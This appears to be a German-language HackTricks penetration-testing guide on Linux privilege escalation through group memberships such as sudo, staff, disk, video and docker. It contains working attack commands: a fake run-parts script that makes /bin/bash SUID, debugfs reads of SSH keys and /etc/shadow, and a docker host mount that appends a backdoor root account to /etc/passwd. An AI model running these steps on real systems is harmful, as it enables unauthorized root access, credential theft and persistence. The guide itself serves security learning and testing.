# Interessante Gruppen – Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo-/Admin-Gruppen

### **PE – Methode 1**

**Manchmal** enthält die **/etc/sudoers**-Richtlinie eines Systems (oder eine darin eingebundene Datei) Einträge wie:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Das bedeutet, dass jeder Benutzer, auf den einer der beiden Einträge zutrifft, über sudo jeden Befehl als beliebiger Zielbenutzer ausführen kann (vorbehaltlich der übrigen Richtlinie).<sup>[[3]](#references)</sup>

Falls dies der Fall ist, kannst du **einfach mit folgendem Befehl root werden**:

```
sudo su
```

Wenn `sudo -l` einen eingeschränkten Aufruf von `adduser` erlaubt, bei dem nur ein Benutzername angegeben werden darf, prüfe, ob dabei eine gleichnamige primäre Gruppe erstellt wird, die noch nicht existiert. Ein neues Konto in dieser Gruppe kann Privilegien erhalten, wenn die effektive sudoers-Richtlinie `%group` bereits Berechtigungen erteilt. Überprüfe sowohl das Verhalten beim Erstellen der Gruppe als auch die Gruppenregel, bevor du dies als Privilege-Escalation-Pfad einstufst. Das Erstellen eines Kontos verändert das System; prüfe daher zuerst die Richtlinie.

### PE - Method 2

Finde alle suid-Binaries und prüfe, ob das Binary **Pkexec** vorhanden ist:

```bash
find / -perm -4000 2>/dev/null
```

Wenn **pkexec eine SUID-Binärdatei ist**, kann es ein Programm nur dann als anderer Benutzer ausführen, wenn polkit die angeforderte Aktion autorisiert; das SUID-Bit allein garantiert keinen root-Zugriff. Prüfe die installierte Richtlinie und die Autorisierung der Zielsitzung, statt anzunehmen, dass die Mitgliedschaft in **sudo** oder **admin** ausreicht.<sup>[[4]](#references)[[5]](#references)</sup>

Prüfe für den separaten [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)-Pfad zuerst, ob `pkexec` eine ausführbare **root-eigene SUID**-Datei ist. Bei einer installierten Binärdatei ohne dieses Bit handelt es sich nicht um die im Advisory beschriebene lokale SUID-Eskalation. Eine Upstream-Versionszeichenfolge ist lediglich ein erster Hinweis: Distributionen können den [Fix in ältere Paketversionen zurückportieren](https://ubuntu.com/security/CVE-2021-4034). Prüfe daher das installierte Anbieterpaket und die vorhandenen Mitigations, bevor du die Version als verwundbar einstufst.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) betrifft einen anderen polkit-Pfad: einen D-Bus-Autorisierungs-Race-Condition-Angriff, keine `pkexec`-SUID-Schwachstelle. Prüfe das installierte polkit-Anbieterpaket und ob eine erreichbare privilegierte D-Bus-Aktion eine nützliche Änderung bewirken kann. Ein Weg zur Kontoerstellung erfordert außerdem einen geeigneten Dienst wie AccountsService, und der sudo-Zugriff einer neu angelegten Gruppe hängt von der effektiven sudo-Richtlinie ab. Eine gemeldete polkit-Version oder ein installierter Dienst ist für sich genommen nur ein möglicher Ansatzpunkt, insbesondere wenn Anbieter [Fixes zurückportieren](https://access.redhat.com/security/cve/cve-2021-3560). Eine passive Enumeration sollte den Race-Condition-Angriff nicht auslösen.

Bei Distributionen, die noch das ältere Local Authority-Backend verwenden, kannst du die Gruppenregeln wie folgt prüfen:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Die relevanten Gruppennamen und Standardwerte variieren je nach Distribution; eine Gruppe ist hier nur dann nützlich, wenn sie in der lokalen Richtlinie genannt wird.<sup>[[5]](#references)</sup>

Um **root zu werden, kannst du Folgendes ausführen**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Wenn du versuchst, **pkexec** auszuführen, und diesen **Fehler** erhältst:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

In einer SSH-Sitzung ohne registrierten Authentifizierungsagenten kann `pkexec` mit diesem Fehler scheitern, selbst wenn die Richtlinie die Aktion andernfalls zulassen würde; polkit dokumentiert `pkttyagent` als textbasierten Authentifizierungsagenten für Sitzungen ohne Desktop-Umgebung. Das genaue Verhalten hängt von Version und Distribution ab. Überprüfen Sie daher die lokale Richtlinie und die Agent-Konfiguration. Eine für betroffene NixOS-Versionen beschriebene Umgehung verwendet **2 verschiedene SSH-Sitzungen**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Eine ACL, die einem Konto den Zugriff auf `su` verweigert, betrifft diese ausführbare Datei, nicht jeden Weg zu einer Aktion, für die eine Administratorautorisierung erforderlich ist. Wenn Administrator-Anmeldedaten unabhängig davon offengelegt wurden, prüfen Sie, ob eine separate Aktion wie das Starten eines temporären Systemdienstes über `systemd-run` durch die wirksame polkit-Richtlinie erlaubt ist, welche Identität der Authentifizierungsagent akzeptiert und welche Identität der gestartete Dienst verwenden würde. [Polkit unterscheidet zwischen der Authentifizierung als Sitzungsinhaber und als Administrator](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), während [systemd-run beim Systemmanager einen temporären Dienst anfordern kann](https://systemd.io/CONTROL_GROUP_INTERFACE/). Ein Eintrag im Verlauf, ein installiertes Kommando oder eine lesbare Richtliniendatei allein belegt weder eine Autorisierung noch gültige Anmeldedaten; eine passive Überprüfung sollte weder Anmeldedaten übermitteln noch eine Unit starten.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel-Gruppe

Manchmal kann eine sudoers-Richtlinie auch diesen Eintrag enthalten:

```
%wheel	ALL=(ALL:ALL) ALL
```

Das bedeutet, dass jeder Benutzer, auf den der Eintrag zutrifft, über sudo jeden Befehl als beliebiger Zielbenutzer ausführen kann (vorbehaltlich der übrigen Richtlinie).<sup>[[3]](#references)</sup>

Ist dies der Fall, kannst du **root werden, indem du einfach Folgendes ausführst**:

```
sudo su
```

## Shadow Group

Auf Systemen, deren Berechtigungen dies erlauben, können Benutzer in der Gruppe **shadow** **/etc/shadow** **lesen**; überprüfen Sie die tatsächlichen Berechtigungen und ACLs auf dem Ziel:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Also lies die Datei und versuche, **einige Hashes zu cracken**.

Wichtiger Hinweis zum Sperrstatus bei der Analyse von Hashes:
- Einträge mit `!` oder `*` können sich im Allgemeinen nicht interaktiv per Passwort anmelden.
- `!hash` bedeutet, dass das Passwort gesperrt wurde; die übrigen Zeichen entsprechen dem Passwortfeld vor der Sperrung.
- Ein Feld mit `*` ist kein gültiger `crypt(3)`-Hash und verhindert die UNIX-Passwortanmeldung; daraus lässt sich nicht ableiten, ob zuvor ein Passwort festgelegt war.
Dies ist für die Kontoklassifizierung hilfreich, auch wenn eine direkte Anmeldung blockiert ist.<sup>[[6]](#references)</sup>

## Gruppe staff

**staff**: Ermöglicht Benutzern, ohne Root-Rechte lokale Änderungen am System (`/usr/local`) vorzunehmen. (Beachte, dass ausführbare Dateien in `/usr/local/bin` in der PATH-Variable aller Benutzer enthalten sind und gleichnamige ausführbare Dateien in `/bin` und `/usr/bin` „überschreiben“ können.) Vergleiche dies mit der Gruppe „adm“, die eher mit Überwachung und Sicherheit zu tun hat.<sup>[[2]](#references)[[7]](#references)</sup>

Bei Debian-Konfigurationen, in denen `/usr/local/bin` in `PATH` vor `/usr/bin` steht (wie in den folgenden Beispielen), wird bei einem nicht vollständig angegebenen Befehl zuerst die Kopie in `/usr/local/bin` ausgeführt. Prüfe den tatsächlich gesetzten `PATH` auf dem Zielsystem.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Wenn ein privilegierter Prozess einen nicht qualifizierten Befehl über ein beschreibbares `/usr/local/bin` auflöst, kann das Ersetzen dieses Befehls mit den Privilegien des Prozesses ausgeführt werden. Bestätige vor dem Testen den tatsächlichen Pfad und Auslöser.

Auf Ubuntu-Systemen führt `pam_motd` beim Login ausführbare Skripte über `run-parts --lsbsysinit` als root aus; Cron-Jobs können ebenfalls `run-parts` verwenden, dies hängt jedoch von der Distribution und Konfiguration ab.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Bei einer neuen SSH-Anmeldung kann `pspy` bestätigen, ob dieser Pfad auf dem Ziel tatsächlich aufgerufen wird; es kann Prozess-Befehlszeilen ohne Root-Rechte beobachten.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Group

Die Mitgliedschaft in der Gruppe **disk** kann Rohzugriff auf Blockgeräte gewähren und kommt häufig **Root-Zugriff nahe**; Debian beschreibt sie als größtenteils gleichbedeutend mit Root. Überprüfe jedoch die tatsächlichen Geräteberechtigungen und das Speicherlayout auf dem Ziel.<sup>[[7]](#references)</sup>

Zu den üblichen Gerätepfaden gehört `/dev/sd*`, aber NVMe und andere Speicherlayouts verwenden andere Namen.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` arbeitet mit ext2/ext3/ext4-Dateisystemen; Pfade wie `/root` und `/etc/shadow` oben sind Dateien innerhalb des geöffneten Dateisystems, während das zweite Argument für `dump` ein Ausgabepfad auf dem nativen Dateisystem ist.<sup>[[8]](#references)</sup> Zum Beispiel extrahiert dies `/tmp/asd1.txt` aus dem geöffneten Dateisystem nach `/tmp/asd2.txt` auf dem nativen Dateisystem:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Die Option `-w` öffnet das Dateisystem mit Lese- und Schreibzugriff, und der Befehl `write` kopiert eine native Datei in das geöffnete Dateisystem. Vermeide die Verwendung auf einem eingehängten Live-Dateisystem, da direkte Änderungen das Dateisystem beschädigen können. Arbeite nach Möglichkeit mit einem Offline-Image.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video Group

Mit dem Befehl `w` kannst du herausfinden, **wer am System angemeldet ist**, und erhältst eine Ausgabe wie die folgende.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Der Eintrag **tty1** bezeichnet die erste virtuelle Linux-Konsole; für sich genommen beweist er nicht, dass sich ein Benutzer physisch am Rechner befindet, insbesondere nicht in Containern oder anderen Umgebungen.<sup>[[21]](#references)</sup>

Auf Systemen, die ein lesbares Framebuffer-Gerät bereitstellen, kann die Mitgliedschaft in der Gruppe **video** Zugriff auf dieses Gerät gewähren. Die Linux-Framebuffer-Schnittstelle dokumentiert `/dev/fb0` als lesbares Speichergerät, dessen Inhalt für eine Bildschirmaufnahme kopiert werden kann. Der Pfad `/sys/class/graphics/fb0/virtual_size` ist nur verfügbar, wenn dieses fbdev-sysfs-Attribut vorhanden ist. Prüfen Sie daher zuerst das Zielsystem.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Wenn die installierte **GIMP**-Version einen Importer für Rohdaten bereitstellt, öffne **`screen.raw`** damit; Unterstützung und Steuerelemente unterscheiden sich je nach Version und Plug-in.<sup>[[22]](#references)</sup>

![Festplatten-Gruppe – Video-Gruppe: Um das Raw-Bild zu öffnen, kannst du GIMP verwenden, die Datei screen.raw auswählen und als Dateityp „Raw image data“ festlegen](<../../../images/image (463).png>)

Stelle Bildbreite und -höhe passend zur Framebuffer-Geometrie ein; probiere die verfügbaren Pixelformate/Bildtypen aus, bis die Ausgabe lesbar ist.<sup>[[9]](#references)</sup>

![Festplatten-Gruppe – Video-Gruppe: Ändere dann Breite und Höhe auf die auf dem Bildschirm verwendeten Werte und probiere verschiedene Bildtypen aus (wähle den aus, bei dem der Bildschirm am besten zu sehen ist)](<../../../images/image (317).png>)

## Root-Gruppe

Die Mitgliedschaft in der Gruppe **root** verleiht nicht die UID von root. Dateien, die der Gruppe `root` gehören und für sie beschreibbar sind, können dennoch interessant sein, wenn privilegierte Dienste oder Bibliotheken sie verwenden. Überprüfe die tatsächlichen Dateiberechtigungen und die Verwendung der Datei, bevor du sie als möglichen Privilege-Escalation-Pfad einstufst.

**Prüfe, welche Dateien Mitglieder der Gruppe root ändern können**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker-Gruppe

Die Mitgliedschaft in der Gruppe `docker` gewährt bei standardmäßigen rootful Installationen Zugriff auf Root-Ebene auf den Docker-Daemon. Da Bind Mounts standardmäßig Lese- und Schreibzugriff erlauben, kann ein Benutzer, der diesen Daemon steuern kann, das `/` des Hosts in einen Container einbinden und Host-Dateien ändern; dadurch erhält er effektiv Root-Zugriff auf dem Host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Die Gruppenmitgliedschaft kann zwischen `/etc/group`, `/etc/gshadow` und dem Token des aktuellen Prozesses abweichen. Wenn ein Benutzer nicht in `id -nG` aufgeführt ist, aber `newgrp docker` erfolgreich ist, prüfe die von `id` in der neuen Shell angezeigte Gruppe und teste, ob der Docker-Socket tatsächlich beschreibbar ist und einen rootful Daemon bedient. Der Gruppenname allein belegt keine Kontrolle über den Host. Begrenze jeden automatisierten `newgrp`-Test, damit eine Passwortabfrage die Enumeration nicht blockiert.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Abschließend kannst du, wenn dir keiner der obigen Vorschläge zusagt oder sie aus irgendeinem Grund nicht funktionieren (Docker-API-Firewall?), immer noch versuchen, **einen privilegierten Container auszuführen und daraus auszubrechen**, wie hier erklärt:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Wenn du Schreibrechte auf den Docker-Socket hast, lies [**diesen Beitrag dazu, wie du durch Missbrauch des Docker-Sockets deine Rechte erweitern kannst**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm Group

**Mitglieder** der Gruppe **`adm`** haben üblicherweise die Berechtigung, **Logdateien** unter _/var/log/_ zu **lesen**.\
Wenn du also einen Benutzer dieser Gruppe kompromittiert hast, solltest du dir die **Logs unbedingt ansehen**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Diese Gruppen haben dienst- und distributionsspezifische Bedeutungen. Debian dokumentiert `backup` für delegierte Sicherungen und Wiederherstellungen, `lp` für Drucker-Daemons und `mail` für `/var/mail`. Überprüfe daher die lokalen Berechtigungen, bevor du eine Gruppenmitgliedschaft als Privilegienpfad einstufst.<sup>[[7]](#references)</sup>

Sie sind oft eher **Vektoren zur Suche nach Zugangsdaten** als direkte Wege zu Root:
- **backup**: Kann Archive mit Konfigurationen, Schlüsseln, DB-Dumps oder Tokens offenlegen.
- **operator**: Betriebssystemspezifischer operativer Zugriff, durch den sensible Laufzeitdaten geleakt werden können.
- **lp**: Druckwarteschlangen und Spool-Dateien können Dokumentinhalte enthalten.
- **mail**: Mail-Spools können Links zum Zurücksetzen von Passwörtern, OTPs und interne Zugangsdaten offenlegen.

Betrachte eine Mitgliedschaft in diesen Gruppen als Befund mit hohem Risiko der Datenoffenlegung und nutze wiederverwendete Passwörter oder Tokens als Pivot.

## Auth group

Unter OpenBSD gehört `/etc/skey` bei konfiguriertem S/Key `root:auth`, und der Zugriff auf die Einträge erfordert die Gruppe `auth`; YubiKey-Einträge werden unter `/var/db/yubikey` gespeichert.<sup>[[16]](#references)[[17]](#references)</sup> Eine anfällige OpenBSD-6.6-Konfiguration mit aktiviertem S/Key oder YubiKey ermöglichte lokalen Benutzern mit `auth`-Rechten, Root zu werden. Qualys dokumentiert die Voraussetzungen und die Exploit-Kette; der verlinkte PoC setzt sie um.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Authentifizierung von pkexec/pkttyagent ohne GUI-Sitzung (NixOS-Problem #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Systemgruppen - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian-Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit-Referenzhandbuch](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit-Referenzhandbuch](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian-Sicherheitshandbuch](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux-Handbuchseite](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Das Framebuffer-Gerät — Linux-Kernel-Dokumentation](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu-Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian-Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivilegiertes Ausspähen von Linux-Prozessen](https://github.com/DominicBreuker/pspy)
- [13] [Sicherheit der Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Docker als Nicht-Root-Benutzer verwalten](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Container ausführen — Docker-Dokumentation](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD-Handbuchseiten](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD-Handbuchseiten](https://man.openbsd.org/login_yubikey.8)
- [18] [Authentifizierungsschwachstellen in OpenBSD — Qualys-Sicherheitswarnung](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — lokaler Exploit-PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux-Gerätezuordnungen (Version 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Bildimport und -export — GIMP-Dokumentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
